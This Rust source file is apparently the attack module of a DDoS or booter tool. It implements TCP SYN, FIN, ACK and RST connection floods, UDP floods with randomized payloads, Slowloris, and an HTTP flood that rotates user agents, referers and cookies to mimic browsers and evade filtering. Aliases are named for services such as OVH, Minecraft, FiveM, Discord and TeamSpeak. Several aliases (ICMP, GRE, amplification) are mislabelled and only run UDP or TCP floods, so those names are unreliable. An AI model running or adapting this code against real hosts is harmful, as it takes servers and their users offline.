use tokio::net::{UdpSocket, TcpStream};
use tokio::time::{Duration, Instant, sleep};
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::sync::Arc;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT_LANGUAGE, CONNECTION, CACHE_CONTROL, COOKIE, CONTENT_TYPE};

// --- Comprehensive Statistics ---

struct AttackStats {
    packets_sent: AtomicU64,
    bytes_sent: AtomicU64,
    errors: AtomicU64,
    active_workers: AtomicUsize,
    
    // Protocol Specific
    http_2xx: AtomicU64,
    http_3xx: AtomicU64,
    http_4xx: AtomicU64,
    http_5xx: AtomicU64,
    
    // Timing Metrics (Microseconds for precision)
    total_latency_micros: AtomicU64,
    latency_samples: AtomicU64,
}

impl AttackStats {
    fn new() -> Self {
        Self {
            packets_sent: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            active_workers: AtomicUsize::new(0),
            http_2xx: AtomicU64::new(0),
            http_3xx: AtomicU64::new(0),
            http_4xx: AtomicU64::new(0),
            http_5xx: AtomicU64::new(0),
            total_latency_micros: AtomicU64::new(0),
            latency_samples: AtomicU64::new(0),
        }
    }

    fn record_packet(&self, size: usize) {
        self.packets_sent.fetch_add(1, Ordering::Relaxed);
        self.bytes_sent.fetch_add(size as u64, Ordering::Relaxed);
    }

    fn record_error(&self) {
        self.errors.fetch_add(1, Ordering::Relaxed);
    }

    fn record_http_status(&self, status: u16) {
        match status {
            200..=299 => self.http_2xx.fetch_add(1, Ordering::Relaxed),
            300..=399 => self.http_3xx.fetch_add(1, Ordering::Relaxed),
            400..=499 => self.http_4xx.fetch_add(1, Ordering::Relaxed),
            500..=599 => self.http_5xx.fetch_add(1, Ordering::Relaxed),
            _ => {}
        };
    }

    fn record_latency(&self, duration: Duration) {
        self.total_latency_micros.fetch_add(duration.as_micros() as u64, Ordering::Relaxed);
        self.latency_samples.fetch_add(1, Ordering::Relaxed);
    }
}

// --- Configuration & Helpers ---

fn get_worker_count() -> usize {
    let cpu_count = num_cpus::get();
    (cpu_count * 4).clamp(8, 128)
}

async fn create_udp_socket(target_addr: &str) -> Option<UdpSocket> {
    let socket = match UdpSocket::bind("0.0.0.0:0").await {
        Ok(s) => s,
        Err(_) => return None,
    };
    if socket.connect(target_addr).await.is_err() {
        return None;
    }
    Some(socket)
}

// --- TCP Flag Emulation (Native) ---

pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
    syn_flood(target, port, duration_secs).await;
}

pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP SYN (Connect) Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let mut backoff = Duration::from_millis(10);
            while start_time.elapsed() < duration {
                let connect_start = Instant::now();
                match tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&target_addr)).await {
                    Ok(Ok(stream)) => {
                        stats.record_latency(connect_start.elapsed());
                        stats.record_packet(0);
                        drop(stream); // Immediate drop -> FIN/RST
                        backoff = Duration::from_millis(10); // Reset backoff
                    }
                    _ => {
                        stats.record_error();
                        sleep(backoff).await;
                        backoff = (backoff * 2).min(Duration::from_secs(1)); // Exponential backoff
                    }
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP SYN").await;
}

pub async fn fin_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP FIN Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    // Shutdown Write half sends a FIN packet immediately
                    if stream.shutdown().await.is_ok() {
                        stats.record_packet(0);
                    } else {
                        stats.record_error();
                    }
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP FIN").await;
}

pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP PSH/ACK Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let mut rng = StdRng::from_entropy();
            let payload = vec![0u8; 1024]; 

            while start_time.elapsed() < duration {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    let _ = stream.set_nodelay(true); 
                    // Burst write with error recovery
                    for _ in 0..10 {
                        if stream.write_all(&payload).await.is_ok() {
                            stats.record_packet(payload.len());
                        } else {
                            stats.record_error();
                            break;
                        }
                    }
                } else {
                    stats.record_error();
                    sleep(Duration::from_millis(rng.gen_range(10..50))).await;
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP PSH/ACK").await;
}

pub async fn rst_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP RST Flood (Linger=0) on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration {
                if let Ok(stream) = TcpStream::connect(&target_addr).await {
                    stats.record_packet(0);
                    // Force RST on drop
                    let _ = stream.set_linger(Some(Duration::from_secs(0)));
                    drop(stream); 
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "TCP RST").await;
}

// --- Advanced HTTP Browser Simulation ---

struct BrowserProfile {
    user_agents: Vec<&'static str>,
    referers: Vec<&'static str>,
    languages: Vec<&'static str>,
}

impl BrowserProfile {
    fn new() -> Self {
        Self {
            user_agents: vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            ],
            referers: vec![
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://twitter.com/",
                "https://www.reddit.com/",
            ],
            languages: vec![
                "en-US,en;q=0.9",
                "en-GB,en;q=0.8",
                "es-ES,es;q=0.9",
                "zh-CN,zh;q=0.9",
            ],
        }
    }

    fn get_headers(&self, rng: &mut StdRng, session_cookie: &str) -> HeaderMap {
        let mut headers = HeaderMap::new();
        
        let ua = self.user_agents[rng.gen_range(0..self.user_agents.len())];
        headers.insert(USER_AGENT, HeaderValue::from_static(ua));

        let referer = self.referers[rng.gen_range(0..self.referers.len())];
        headers.insert(REFERER, HeaderValue::from_static(referer));

        let lang = self.languages[rng.gen_range(0..self.languages.len())];
        headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static(lang));

        headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
        headers.insert(CACHE_CONTROL, HeaderValue::from_static("no-cache"));
        
        if let Ok(val) = HeaderValue::from_str(session_cookie) {
            headers.insert(COOKIE, val);
        }

        headers
    }
}

pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Advanced HTTP Browser Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_url = format!("http://{}:{}/", target, port);
    let profile = Arc::new(BrowserProfile::new());

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_url = target_url.clone();
        let profile = profile.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let client = reqwest::Client::builder()
                .pool_max_idle_per_host(100)
                .timeout(Duration::from_secs(10))
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap_or_default();

            let mut rng = StdRng::from_entropy();
            let mut backoff = Duration::from_millis(10);

            // Session Management: Keep cookie for N requests
            let mut session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
            let mut requests_in_session = 0;

            while Instant::now() < end_time {
                // Rotate session occasionally
                if requests_in_session > 50 {
                    session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
                    requests_in_session = 0;
                }

                let headers = profile.get_headers(&mut rng, &session_cookie);
                
                // Mixed Traffic: 80% GET, 20% POST
                let is_post = rng.gen_bool(0.2);
                
                let req_builder = if is_post {
                    let body_data = format!("{{\"data\": \"{}\", \"timestamp\": {}}}", rng.gen::<u64>(), chrono::Utc::now().timestamp());
                    client.post(&target_url)
                        .headers(headers.clone())
                        .header(CONTENT_TYPE, "application/json")
                        .body(body_data)
                } else {
                    client.get(&target_url).headers(headers.clone())
                };

                let start = Instant::now();
                match req_builder.send().await {
                    Ok(resp) => {
                        stats.record_latency(start.elapsed());
                        stats.record_packet(1);
                        stats.record_http_status(resp.status().as_u16());
                        backoff = Duration::from_millis(10); // Reset backoff
                        requests_in_session += 1;
                    },
                    Err(_) => {
                        stats.record_error();
                        sleep(backoff).await;
                        backoff = (backoff * 2).min(Duration::from_secs(2));
                    }
                }
                
                // Random Jitter for realism
                sleep(Duration::from_millis(rng.gen_range(1..5))).await;
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "HTTP Browser").await;
}

// --- UDP Methods ---

pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting UDP Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);
    let payload = Arc::new(vec![0u8; 1400]); 

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        let payload = payload.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let socket = match create_udp_socket(&target_addr).await {
                Some(s) => s,
                None => return,
            };

            while Instant::now() < end_time {
                if socket.send(&payload).await.is_ok() {
                    stats.record_packet(payload.len());
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "UDP").await;
}

pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Smart UDP Flood on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            let socket = match create_udp_socket(&target_addr).await {
                Some(s) => s,
                None => return,
            };

            let mut rng = StdRng::from_entropy();
            let mut packet_pool = Vec::with_capacity(64);
            for _ in 0..64 {
                let size = rng.gen_range(64..1200);
                let mut p = vec![0u8; size];
                rng.fill(&mut p[..]);
                packet_pool.push(p);
            }

            let mut idx = 0;
            while Instant::now() < end_time {
                let payload = &packet_pool[idx % packet_pool.len()];
                idx = idx.wrapping_add(1);

                if socket.send(payload).await.is_ok() {
                    stats.record_packet(payload.len());
                } else {
                    stats.record_error();
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "Smart UDP").await;
}

// --- Application Layer ---

pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Slowloris on {}:{} for {}s", target, port, duration_secs);
    let stats = Arc::new(AttackStats::new());
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count() * 2; 
    let target_addr = format!("{}:{}", target, port);

    let mut handles = vec![];
    for _ in 0..num_workers {
        let stats = stats.clone();
        let target_addr = target_addr.clone();
        stats.active_workers.fetch_add(1, Ordering::Relaxed);

        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                    stats.record_packet(1); // 1 Connection
                    let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
                    let _ = stream.write_all(format!("Host: {}\r\n", target_addr).as_bytes()).await;
                    let _ = stream.write_all(b"User-Agent: Mozilla/5.0\r\n").await;
                    
                    let mut interval = tokio::time::interval(Duration::from_secs(10));
                    loop {
                        if Instant::now() >= end_time { break; }
                        interval.tick().await;
                        let header = format!("X-KeepAlive-{}: {}\r\n", rand::random::<u32>(), rand::random::<u32>());
                        if stream.write_all(header.as_bytes()).await.is_err() {
                            stats.record_error();
                            break; 
                        }
                    }
                } else {
                    stats.record_error();
                    sleep(Duration::from_secs(1)).await;
                }
            }
            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
        });
        handles.push(handle);
    }
    await_and_report(handles, stats, "Slowloris").await;
}

// --- Reporting ---

async fn await_and_report(handles: Vec<tokio::task::JoinHandle<()>>, stats: Arc<AttackStats>, name: &str) {
    let stats_clone = stats.clone();
    let reporter = tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(5));
        loop {
            interval.tick().await;
            let packets = stats_clone.packets_sent.load(Ordering::Relaxed);
            let workers = stats_clone.active_workers.load(Ordering::Relaxed);
            if workers == 0 && packets > 0 { break; } 
        }
    });

    for handle in handles {
        let _ = handle.await;
    }
    let _ = reporter.await;
    
    let total_pkts = stats.packets_sent.load(Ordering::Relaxed);
    let total_samples = stats.latency_samples.load(Ordering::Relaxed);
    let avg_latency = if total_samples > 0 {
        stats.total_latency_micros.load(Ordering::Relaxed) as f64 / total_samples as f64 / 1000.0
    } else {
        0.0
    };

    println!("{} Attack Complete.", name);
    println!("  Total Packets/Reqs: {}", total_pkts);
    println!("  Total Data Sent:    {:.2} MB", stats.bytes_sent.load(Ordering::Relaxed) as f64 / 1024.0 / 1024.0);
    println!("  Total Errors:       {}", stats.errors.load(Ordering::Relaxed));
    println!("  Avg Latency:        {:.2} ms", avg_latency);
    
    if stats.http_2xx.load(Ordering::Relaxed) > 0 || stats.http_5xx.load(Ordering::Relaxed) > 0 {
        println!("  HTTP Stats:");
        println!("    2xx: {}", stats.http_2xx.load(Ordering::Relaxed));
        println!("    3xx: {}", stats.http_3xx.load(Ordering::Relaxed));
        println!("    4xx: {}", stats.http_4xx.load(Ordering::Relaxed));
        println!("    5xx: {}", stats.http_5xx.load(Ordering::Relaxed));
    }
}

// --- Aliases & Fallbacks ---

pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64) { udp_flood(target, port, duration_secs).await; }
pub async fn gre_flood(target: &str, duration_secs: u64) { udp_flood(target, 47, duration_secs).await; }
pub async fn icmp_flood(target: &str, duration_secs: u64) { udp_flood(target, 80, duration_secs).await; }
pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) { syn_flood(target, port, duration_secs).await; }
pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; } 
pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
pub async fn http_stress(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
pub async fn sip_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; }
pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn discord_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
